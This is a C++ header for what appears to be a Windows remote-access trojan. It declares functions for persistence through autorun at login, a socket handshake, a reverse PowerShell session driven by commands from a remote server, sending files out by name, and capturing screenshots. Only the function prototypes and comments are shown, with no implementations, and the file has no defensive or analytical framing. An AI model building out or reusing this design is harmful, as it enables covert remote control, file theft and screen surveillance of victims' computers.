#pragma once
//how to include winsock2: https://stackoverflow.com/questions/11726958/cant-include-winsock2-h-in-msvc-2010


#include <iostream>
#include <WinSock2.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <gdiplus.h>
#include <shlwapi.h>

#pragma comment (lib, "gdiplus.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Shlwapi.lib")

//allow program to automatically start when user logs in
void setAutoRun();

bool initWSA();

//a little check before opening the shell
bool performHandshake(SOCKET s);

//create a new powershell process
int spawnPowerShell(SOCKET s);

//receive powershell commands from the server and pass them to powershell
int communicatePowerShell(SOCKET s);

//release all process and pipe handles
void cleanUp();

//get file content by name
int getFileContent(SOCKET s, char* filename);

//take a scrrenshot
int captureScreen(SOCKET s);

//taken directly from https://gist.github.com/prashanthrajagopal/05f8ad157ece964d8c4d
//get image encoder clsid to save an image
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);